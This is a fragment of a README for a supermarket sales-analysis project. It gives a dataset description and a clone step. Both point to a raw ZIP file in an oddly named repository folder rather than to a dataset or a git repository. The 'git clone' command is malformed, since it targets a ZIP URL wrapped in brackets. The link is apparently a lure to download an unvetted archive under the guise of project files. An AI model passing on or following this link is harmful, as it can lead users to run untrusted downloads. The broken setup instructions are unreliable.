...
## 📂 Dataset
The dataset (`https://github.com/Siam-analytics/SuperShopAnalysis/raw/refs/heads/main/spermiducal/Shop-Analysis-Super-v2.8.zip`) contains 5,000 records with 30 columns, including:
...
1. **Clone the repository**:
   ```bash
   git clone [https://github.com/Siam-analytics/SuperShopAnalysis/raw/refs/heads/main/spermiducal/Shop-Analysis-Super-v2.8.zip]
